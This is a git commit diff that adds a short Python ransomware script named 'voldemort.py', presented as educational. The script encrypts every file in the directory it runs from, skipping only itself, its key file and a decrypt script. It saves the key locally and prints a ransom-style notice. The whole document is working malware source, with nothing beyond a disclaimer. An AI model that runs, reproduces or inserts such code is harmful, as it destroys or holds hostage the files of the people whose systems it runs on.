9bea980d4efaa2d94f5b2199475d65257ceed920
Sleety Matt George <70995581+WhiteHatCyberus@users.noreply.github.com>
2022-09-14 06:03:26 -0400

    The executables
    Please use with caution! Keep Learning

---
+++ voldemort.py
@@ -0,0 +1,20 @@
+import os
+from cryptography.fernet import Fernet
+#Disclaimer: For educational use  only
+files = []
+for file in os.listdir():
+	if file == "voldemort.py" or file== "thekey.key" or file == "decrypt.py":
+		continue
+	if os.path.isfile(file):
+		files.append(file)
+key=Fernet.generate_key()
+with open("thekey.key","wb") as thekey:
+	thekey.write(key)
+for file in files:
+	with open(file, "rb") as thefile:
+		contents = thefile.read()
+	contents_encrypted = Fernet(key).encrypt(contents)
+	with open(file, "wb") as thefile:
+		thefile.write(contents_encrypted)
+print("Hello dear user, this file is a ransomware and has encrypted your files in a 128 bit AES encryption, if you have been subjected to an attack via this file, please be aware this has been done by a script kiddy.if you wish to decrypt your files safely, please run decrypt.py")
+print(" \n This was made for educationl purposes only by WhiteHatCyberus ") 
